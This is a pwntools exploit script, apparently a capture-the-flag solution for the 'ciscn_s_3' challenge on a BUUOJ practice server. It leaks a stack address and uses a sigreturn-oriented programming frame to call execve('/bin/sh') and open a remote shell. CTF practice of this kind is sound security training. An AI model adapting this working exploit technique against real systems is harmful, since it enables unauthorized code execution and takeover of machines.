from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
io = remote('node4.buuoj.cn', 27475)
# io = process('ciscn_s_3')
elf = ELF('ciscn_s_3')
main_addr = elf.symbols['main']
syscall_retn = 0x400517
mov_rax_0xf_ret = 0x4004DA

payload = b'/bin/sh\x00' * 2 + p64(main_addr) 
io.sendline(payload)
bin_sh_addr = u64(io.recvn(0x28)[-8:]) - 312
log.success('bin_sh_addr: ' + hex(bin_sh_addr))

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_retn
payload = b'/bin/sh\x00' * 2 + p64(mov_rax_0xf_ret) + p64(syscall_retn) + bytes(frame)
io.sendline(payload)
io.interactive()

